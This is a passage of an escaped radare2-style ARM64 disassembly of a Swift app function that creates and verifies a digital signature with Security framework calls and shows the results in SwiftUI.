  \u2502\u2502\u2502\u2502   0x100004ce0      ldr x0, [x19, 0x40]\n\u2502    \u2502\u2502\u2502\u2502   0x100004ce4      str x20, [x19, 0x50]\n\u2502    \u2502\u2502\u2502\u2502   0x100004ce8      mov x1, x20\n\u2502    \u2502\u2502\u2502\u2502   0x100004cec      bl sym Foundation.Data._bridgeToObjectiveC.NSData...F ; sym.imp.Foundation.Data._bridgeToObjectiveC.NSData...F\n\u2502    \u2502\u2502\u2502\u2502   0x100004cf0      mov x20, x0\n\u2502    \u2502\u2502\u2502\u2502   0x100004cf4      add x3, x19, 0x90\n\u2502    \u2502\u2502\u2502\u2502   0x100004cf8      mov x0, x28\n\u2502    \u2502\u2502\u2502\u2502   0x100004cfc      mov x1, x23\n\u2502    \u2502\u2502\u2502\u2502   0x100004d00      mov x2, x20\n\u2502    \u2502\u2502\u2502\u2502   0x100004d04      bl sym.imp.SecKeyCreateSignature\n\u2502    \u2502\u2502\u2502\u2502   0x100004d08      mov x27, x0\n\u2502    \u2502\u2502\u2502\u2502   0x100004d0c      bl sym.imp.objc_release_x20\n\u2502   \u250c\u2500\u2500\u2500\u2500\u2500&lt; 0x100004d10      cbz x27, 0x10000515c\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d14      str x26, [x19]\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d18      str x24, [x19, 0x48]\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d1c      mov x0, x27\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d20      bl sym Foundation.Data._unconditionallyBridgeFromObjectiveC.NSData...gFZ ; sym.imp.Foundation.Data._unconditionallyBridgeFromObjectiveC.NSData...gFZ\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d24      mov x20, x0\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d28      mov x26, x1\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d2c      bl sym.func.100004000\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d30      mov x21, x0\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d34      mov x0, x20                               ; void *arg0\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d38      mov x1, x26                               ; int64_t arg2\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d3c      bl sym.func.100005384\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d40      stur x21, [x29, -0x88]\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d44      mov x24, -0x2000000000000000\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d48      sub x20, x29, 0x88\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d4c      mov x0, 0\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d50      mov x1, -0x2000000000000000\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d54      ldr x2, [x19, 0x10]\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d58      mov x3, x22\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d5c      bl sym Element...F                        ; sym.imp.Element...F\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d60      str x0, [x19, 0x10]\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d64      mov x26, x1\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d68      mov x0, x21                               ; void *arg0\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d6c      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d70      ldr x25, [x19, 0x40]\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d74      mov x0, x25\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d78      ldr x21, [x19, 0x50]\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d7c      mov x1, x21\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d80      bl sym Foundation.Data._bridgeToObjectiveC.NSData...F ; sym.imp.Foundation.Data._bridgeToObjectiveC.NSData...F\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d84      mov x20, x0\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d88      add x4, x19, 0x90\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d8c      ldr x0, [x19, 0x30]\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d90      mov x1, x23\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d94      mov x2, x20\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d98      mov x3, x27\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004d9c      bl sym.imp.SecKeyVerifySignature\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004da0      mov x23, x0\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004da4      bl sym.imp.objc_release_x20\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004da8      stp xzr, x24, [x29, -0x88]\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004dac      sub x20, x29, 0x88\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004db0      mov w0, 0x49                              ; 'I'\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004db4      bl sym _StringGuts.grow...SiF             ; sym.imp._StringGuts.grow...SiF\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004db8      ldp x8, x9, [x29, -0x88]\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004dbc      stp x8, x9, [x29, -0x88]\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004dc0      sub x20, x29, 0x88\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004dc4      mov x0, 0x724f                            ; 'Or'\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004dc8      movk x0, 0x6769, lsl 16                   ; 'ig'\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004dcc      movk x0, 0x6e69, lsl 32                   ; 'in'\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004dd0      movk x0, 0x6c61, lsl 48                   ; 'al'\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004dd4      mov x1, 0x203a                            ; ': '\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004dd8      movk x1, 0xea00, lsl 48\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004ddc      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004de0      ldr x20, [x19, 0x58]\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004de4      mov x8, x20\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004de8      bl sym Foundation...8EncodingV4utf8ACvgZ  ; sym.imp.Foundation...8EncodingV4utf8ACvgZ\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004dec      mov x0, x25\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004df0      mov x1, x21\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004df4      mov x2, x20\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x100004df8      bl sym Foundation__String...AAE8EncodingVtcfC ; sym.imp.Foundation__String...AAE8EncodingVtcfC\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500&lt; 0x100004dfc      cbz x1, 0x100005294\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e00      mov x25, x1\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e04      adrp x8, 0x100008000\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e08      add x8, x8, 0x580                         ; 0x100008580 ; \"Signature is valid.\"\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e0c      sub x8, x8, 0x20\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e10      orr x8, x8, 0x8000000000000000\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e14      adrp x9, 0x100008000\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e18      add x9, x9, 0x600                         ; 0x100008600 ; \"Signature is invalid.\"\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e1c      sub x9, x9, 0x20\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e20      orr x9, x9, 0x8000000000000000\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e24      cmp w23, 0\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e28      csel x24, x9, x8, eq\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e2c      mov x22, 0x10\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e30      movk x22, 0xd000, lsl 48\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e34      add x21, x22, 3\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e38      add x8, x22, 5\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e3c      csel x23, x8, x21, eq\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e40      sub x20, x29, 0x88\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e44      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e48      mov x0, x25                               ; void *arg0\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e4c      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e50      add x0, x22, 4\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e54      adrp x8, 0x100008000\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e58      add x8, x8, 0x5a0                         ; 0x1000085a0 ; \"\\n\\nPublic Key (Hex): \"\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e5c      sub x8, x8, 0x20\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e60      orr x1, x8, 0x8000000000000000\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e64      sub x20, x29, 0x88\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e68      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e6c      sub x20, x29, 0x88\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e70      ldr x0, [x19, 8]\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e74      ldr x25, [x19, 0x18]\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e78      mov x1, x25\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e7c      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e80      adrp x8, 0x100008000\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e84      add x8, x8, 0x5c0                         ; 0x1000085c0 ; \"\\n\\nSignature (Hex): \"\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e88      sub x8, x8, 0x20\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e8c      orr x1, x8, 0x8000000000000000\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e90      sub x20, x29, 0x88\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e94      mov x0, x21\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e98      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004e9c      sub x20, x29, 0x88\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ea0      ldr x0, [x19, 0x10]\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ea4      mov x1, x26\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ea8      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004eac      adrp x8, 0x100008000\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004eb0      add x8, x8, 0x5e0                         ; 0x1000085e0 ; \"\\n\\nVerification: \"\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004eb4      sub x8, x8, 0x20\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004eb8      orr x1, x8, 0x8000000000000000\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ebc      sub x20, x29, 0x88\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ec0      mov x0, 0x10\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ec4      movk x0, 0xd000, lsl 48\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ec8      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ecc      sub x20, x29, 0x88\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ed0      mov x0, x23\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ed4      mov x1, x24\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ed8      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004edc      ldp x8, x21, [x29, -0x88]\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ee0      ldr x10, [x19, 0x60]\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ee4      ldr x9, [x19, 0x68]\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ee8      stp x10, x9, [x29, -0x88]\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004eec      ldr x9, [x19, 0x70]\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ef0      stur x9, [x29, -0x78]\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ef4      stp x8, x21, [x19, 0x80]\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004ef8      mov x0, x21                               ; void *arg0\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004efc      bl sym.imp.swift_bridgeObjectRetain       ; void *swift_bridgeObjectRetain(void *arg0)\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f00      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f04      add x0, x0, 0x358                         ; int64_t arg1\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f08      bl sym.func.1000052a8\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f0c      mov x1, x0\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f10      add x0, x19, 0x80\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f14      sub x20, x29, 0x88\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f18      bl sym SwiftUI.State.wrappedValue...s     ; sym.imp.SwiftUI.State.wrappedValue...s\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f1c      ldr x0, [x19, 0x38]                       ; void *arg0\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f20      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f24      ldp x0, x1, [x19, 0x20]                   ; int64_t arg2\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f28      bl sym.func.100005384\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f2c      mov x0, x26                               ; void *arg0\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f30      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f34      mov x0, x24                               ; void *arg0\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f38      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f3c      mov x0, x21                               ; void *arg0\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f40      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f44      bl sym.imp.objc_release_x27\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f48      ldr x0, [x19, 0x40]                       ; int64_t arg2\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f4c      ldr x1, [x19, 0x50]\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f50      bl sym.func.10000544c\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f54      mov x0, x25                               ; void *arg0\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f58      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f5c      ldr x0, [x19]\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x100004f60      ldr x1, [x19, 0x48]\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500&lt; 0x100004f64      b 0x100005234\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; CODE XREF from sym.func.10000491c @ 0x100004b8c(x)\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u2514\u2500&gt; 0x100004f68      mov x8, -0x2000000000000000\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004f6c      stp xzr, x8, [x29, -0x88]\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004f70      sub x20, x29, 0x88\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004f74      mov w0, 0x20\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004f78      bl sym _StringGuts.grow...SiF             ; sym.imp._StringGuts.grow...SiF\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004f7c      ldur x0, [x29, -0x80]                     ; void *arg0\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004f80      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004f84      mov x8, 0x10\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004f88      movk x8, 0xd000, lsl 48\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004f8c      orr x8, x8, 0xe\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004f90      adrp x9, 0x100008000\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004f94      add x9, x9, 0x4e0                         ; 0x1000084e0 ; \"Failed to create private key: \"\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004f98      sub x9, x9, 0x20\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004f9c      orr x9, x9, 0x8000000000000000\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fa0      stp x8, x9, [x29, -0x88]\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fa4      ldr x8, [x19, 0x90]\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fa8      str x8, [x19, 0x80]\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fac      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fb0      add x0, x0, 0x350                         ; int64_t arg1\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fb4      bl sym.func.1000052a8\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fb8      mov x1, x0\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fbc      add x0, x19, 0x80\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fc0      bl sym describing__String...clufC         ; sym.imp.describing__String...clufC\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fc4      mov x21, x1\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fc8      sub x20, x29, 0x88\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fcc      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fd0      mov x0, x21                               ; void *arg0\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fd4      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fd8      ldp x8, x21, [x29, -0x88]\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fdc      stp x26, x24, [x29, -0x88]\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fe0      ldr x9, [x19, 0x70]\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fe4      stur x9, [x29, -0x78]\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fe8      stp x8, x21, [x19, 0x80]\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004fec      mov x0, x21                               ; void *arg0\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004ff0      bl sym.imp.swift_bridgeObjectRetain       ; void *swift_bridgeObjectRetain(void *arg0)\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004ff4      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004ff8      add x0, x0, 0x358                         ; int64_t arg1\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100004ffc      bl sym.func.1000052a8\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100005000      mov x1, x0\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100005004      add x0, x19, 0x80\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100005008      sub x20, x29, 0x88\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x10000500c      bl sym SwiftUI.State.wrappedValue...s     ; sym.imp.SwiftUI.State.wrappedValue...s\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100005010      mov x0, x25                               ; void *arg0\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100005014      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100005018      mov x0, x23                               ; void *arg0\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x10000501c      mov x1, x22                               ; int64_t arg2\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502    0x100005020      bl sym.func.100005384\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u250c\u2500&lt; 0x100005024      b 0x100005150\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; CODE XREF from sym.func.10000491c @ 0x100004b9c(x)\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2514\u2500\u2500&gt; 0x100005028      ldr x9, [x19, 0x60]\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x10000502c      ldr x8, [x19, 0x68]\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005030      stp x9, x8, [x29, -0x88]\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005034      ldr x8, [x19, 0x70]\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005038      stur x8, [x29, -0x78]\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x10000503c      mov w8, 0xd\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005040      mov x9, 0x10\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005044      movk x9, 0xd000, lsl 48\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005048      orr x8, x9, x8\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x10000504c      adrp x9, 0x100008000\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005050      add x9, x9, 0x500                         ; 0x100008500 ; \"Failed to generate public key\"\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005054      sub x9, x9, 0x20\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005058      orr x9, x9, 0x8000000000000000\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x10000505c      stp x8, x9, [x19, 0x80]\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005060      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005064      add x0, x0, 0x358                         ; int64_t arg1\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005068      bl sym.func.1000052a8\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x10000506c      mov x1, x0\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005070      add x0, x19, 0x80\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005074      sub x20, x29, 0x88\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005078      bl sym SwiftUI.State.wrappedValue...s     ; sym.imp.SwiftUI.State.wrappedValue...s\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x10000507c      mov x0, x25                               ; void *arg0\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005080      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005084      mov x0, x23                               ; void *arg0\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005088      mov x1, x22                               ; int64_t arg2\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x10000508c      bl sym.func.100005384\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x100005090      bl sym.imp.objc_release_x28\n\u2502 \u2502\u2502\u2502\u2502\u2502\u250c\u2500\u2500&lt; 0x100005094      b 0x100005244\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; CODE XREF from sym.func.10000491c @ 0x100004bc0(x)\n\u2502 \u2502\u2502\u2502\u2502\u2514\u2500\u2500\u2500&gt; 0x100005098      mov x8, -0x2000000000000000\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x10000509c      stp xzr, x8, [x29, -0x88]\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050a0      sub x20, x29, 0x88\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050a4      mov w0, 0x20\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050a8      bl sym _StringGuts.grow...SiF             ; sym.imp._StringGuts.grow...SiF\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050ac      ldur x0, [x29, -0x80]                     ; void *arg0\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050b0      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050b4      add x8, x21, 0xe\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050b8      adrp x9, 0x100008000\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050bc      add x9, x9, 0x520                         ; 0x100008520 ; \"Failed to extract public key: \"\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050c0      sub x9, x9, 0x20\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050c4      orr x9, x9, 0x8000000000000000\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050c8      stp x8, x9, [x29, -0x88]\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050cc      ldr x8, [x19, 0x90]\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050d0      str x8, [x19, 0x80]\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050d4      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050d8      add x0, x0, 0x350                         ; int64_t arg1\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050dc      bl sym.func.1000052a8\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050e0      mov x1, x0\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050e4      add x0, x19, 0x80\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050e8      bl sym describing__String...clufC         ; sym.imp.describing__String...clufC\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050ec      mov x21, x1\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050f0      sub x20, x29, 0x88\n\u2502 \u2502\u2502\u2502\u2502 